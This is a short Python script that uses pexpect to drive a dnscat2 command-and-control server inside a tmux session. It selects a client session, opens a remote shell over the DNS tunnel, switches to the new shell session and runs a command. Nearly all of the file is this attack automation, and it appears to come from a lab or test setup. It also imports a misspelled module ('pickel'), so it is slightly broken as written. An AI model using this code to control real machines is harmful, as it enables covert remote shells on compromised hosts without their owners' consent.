import subprocess
import os 
import time
import pexpect
import socket
import pickel

hostname = socket.gethostname()
print("Hostname:", hostname)

if hostname == 'server':
    session_name = "dns_session_server"

    # Attach to the tmux session to interact with dnscat2
    tmux_process = pexpect.spawn(f'tmux attach -t {session_name}')
    time.sleep(5)
    # Wait for dnscat2 prompt
    tmux_process.expect('dnscat2>')
    time.sleep(15)
    # tmux_process.sendline('')

    # Send commands using Pexpect
    tmux_process.sendline('session -i 1')
    # tmux_process.sendline('')  # Send an "Enter" key press
    time.sleep(3)
    tmux_process.expect('dnscat2>')
    # tmux_process.sendline('')  # Send an "Enter" key press

    print("Session 1 initiated")
    time.sleep(5)
    tmux_process.sendline('shell')
    # tmux_process.sendline('')  # Send an "Enter" key press


    tmux_process.expect('dnscat2>')
    # tmux_process.sendline('')  # Send an "Enter" key press

    print("Shell session started")
    time.sleep(5)
    tmux_process.sendline('session -i 2')
    tmux_process.sendline('')  # Send an "Enter" key press

    time.sleep(3)
    tmux_process.expect('dnscat2>')
    print("Session 2 initiated")

    time.sleep(5)
    tmux_process.sendline('ls')


    # Continue with other commands if needed
    # tmux_process.sendline('your_next_command_here')
    # tmux_process.expect('dnscat2>')

    # Close the connection
    tmux_process.close()
    print("Connection closed")
